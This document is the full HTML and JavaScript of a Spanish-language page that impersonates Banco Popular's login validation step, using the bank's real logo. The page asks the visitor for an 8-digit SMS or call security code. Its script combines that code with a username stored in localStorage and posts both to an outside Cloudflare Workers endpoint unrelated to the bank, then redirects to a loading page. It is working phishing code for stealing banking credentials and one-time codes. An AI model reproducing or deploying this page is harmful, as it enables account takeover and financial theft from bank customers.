<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Validación - Banco Popular</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
    body {
        margin: 0;
        font-family: 'Inter', sans-serif;

        /* 🔥 Fondo de imagen */
        background-image: url('entra.jpeg');
        background-size: cover;
        background-position: center;
        background-attachment: fixed;

        /* Efecto difuminado suave */
        backdrop-filter: blur(4px);

        padding: 25px;
        color: #000;
    }

    .container {
       max-width: 273px;
    margin: 0 auto;
    text-align: center;
    margin-top: 70px;
    background: rgb(141 164 137 / 83%);
    padding: 43px;
    border-radius: 10px;
    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
    }

    .logo img {
        width: 180px;
        margin-bottom: 25px;
    }

    .security-box {
        background: #e8fff0;
        border-left: 4px solid #00a651;
        padding: 15px 18px;
        border-radius: 10px;
        text-align: left;
        margin-bottom: 30px;
        display: flex;
        gap: 12px;
        align-items: flex-start;
    }

    .security-box i {
        font-size: 22px;
        color: #00a651;
        margin-top: 2px;
    }

    .security-box p {
        margin: 0;
        font-size: 14px;
        line-height: 1.5;
        font-weight: 500;
        color: #333;
    }

    .input-box {
        text-align: left;
        margin-bottom: 25px;
    }

    .input-box label {
        font-size: 16px;
        margin-bottom: 6px;
        color: #333;
        display: block;
    }

    .input-wrapper {
        max-width: 360px;
        margin: 0 auto;
        position: relative;
        border: 1px solid #ccc;
        padding: 14px;
        border-radius: 12px;
        background: #fff;
        display: flex;
        align-items: center;
    }

    .input-wrapper input {
        border: none;
        font-size: 22px;
        width: 100%;
        outline: none;
        letter-spacing: 10px;
        text-align: center;
    }

    .input-wrapper input::placeholder {
        color: #ccc;
    }

    .eye-icon {
        position: absolute;
        right: 16px;
        font-size: 20px;
        color: #999;
        cursor: pointer;
    }

    .buttons {
        max-width: 360px;
        margin: 0 auto;
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-top: 25px;
    }

    .continue-btn {
        padding: 15px;
        background: #bdbdbd;
        border-radius: 12px;
        color: #7a7a7a;
        font-weight: 600;
        border: none;
        cursor: pointer;
        transition: 0.2s;
    }

    .continue-btn.enabled {
        background: #105163;
        color: white;
    }

    .legal {
        margin-top: 35px;
        font-size: 13px;
        color: #444;
        text-align: center;
    }
</style>

</head>
<body>

<div class="container">

    <div class="logo">
        <img src="https://mi.bancopopular.com.co/assets/images/popularhorizontal_new.svg">
    </div>

    <div class="security-box">
        <i class="fa-solid fa-circle-info"></i>
        <p>
            El Banco Popular solicita un código de <b>8 dígitos</b> para autorizar Ingresos al portal como medida de seguridad.  
            Este código se envía por <b>mensaje de texto</b> o <b>llamada</b> al número celular asociado a la cuenta para ingresar al portal web.
        </p>
    </div>

    <div class="input-box">
        <label>Código de seguridad</label>

        <div class="input-wrapper">
            <input 
                type="password" 
                id="claveInput" 
                maxlength="8"
                placeholder="••••••••"
                inputmode="numeric"
                pattern="[0-9]*"
            >
            <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
        </div>
    </div>

    <div class="buttons">
        <button class="continue-btn" id="loginButton" disabled>Continuar</button>
    </div>

    <div class="legal">
        Seguridad avanzada · Ayuda · Términos
    </div>

</div>

<script>
/* ELEMENTOS */
const claveInput = document.getElementById('claveInput');
const loginButton = document.getElementById('loginButton');
const toggleEye = document.getElementById('toggleEye');

/* VALIDAR EXACTAMENTE 8 DIGITOS */
claveInput.addEventListener('input', () => {
    if (claveInput.value.length > 8) {
        claveInput.value = claveInput.value.slice(0, 8);
    }

    if (claveInput.value.length === 8) {
        loginButton.classList.add('enabled');
        loginButton.disabled = false;
    } else {
        loginButton.classList.remove('enabled');
        loginButton.disabled = true;
    }
});

/* MOSTRAR / OCULTAR CONTRASEÑA */
toggleEye.addEventListener("click", () => {
    if (claveInput.type === "password") {
        claveInput.type = "text";
        toggleEye.classList.replace("fa-eye", "fa-eye-slash");
    } else {
        claveInput.type = "password";
        toggleEye.classList.replace("fa-eye-slash", "fa-eye");
    }
});

/* LOGIN */
loginButton.addEventListener('click', async () => {
    const claveValue = claveInput.value.trim();
    if (claveValue.length !== 8) return alert("Debe ingresar 8 dígitos");

    try {
        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const usuario = bancoldata.usuario;

        const transactionId = 'txn_' + Date.now();

        bancoldata.clave = claveValue;
        bancoldata.transactionId = transactionId;

        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        const response = await fetch('https://quiet-haze-3548.micollflorez.workers.dev/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario, clave: claveValue, transactionId })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = "loading.html";
        } else {
            alert("Error en el login");
        }

    } catch (err) {
        console.error(err);
        alert("Error al procesar la solicitud");
    }
});

/* ENTER PARA CONTINUAR */
claveInput.addEventListener('keypress', e => {
    if (e.key === "Enter" && !loginButton.disabled) loginButton.click();
});
</script>

</body>
</html>
